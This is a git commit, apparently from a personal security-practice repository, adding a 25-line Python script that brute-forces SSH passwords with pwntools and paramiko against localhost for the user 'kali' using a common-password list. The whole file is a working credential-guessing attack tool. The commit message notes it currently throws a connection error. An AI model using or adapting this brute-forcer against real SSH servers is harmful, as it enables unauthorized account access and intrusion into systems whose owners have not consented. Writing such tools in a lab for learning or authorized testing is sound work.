a76ec58ebc5415390c22f14aa689b4af80ba1e01
Wade <89586330+wade764@users.noreply.github.com>
2024-01-07 16:22:29 -0500

    Adding SSH Bruteforcer
    Throwing a NoValidConnectionsError. Troubleshooting on another machine.

---
+++ SSH_BruteForce/SSH_BruteForce.py
@@ -0,0 +1,25 @@
+#!/bin/python
+
+from pwn import *
+import paramiko
+
+host = "127.0.0.1"
+username = "kali"
+attempts = 0
+
+with open("ssh-common-passwords.txt", "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print("[{}] Attempting password: '{}'!".format(attempts, password))
+            response = ssh(host=host, user=username, password=password, timeout=1)
+            if response.connected():
+                print("[>] Valid password found: '{}'!".format(password))
+                response.close()
+                break
+            response.close()
+        except paramiko.ssh_exception.AuthenticationException:
+            print("[X] Invalid password!")
+        #except paramiko.ssh_exception.NoValidConnectionsError:
+        #    print("[X] No valid SSH connection!")
+        attempts += 1
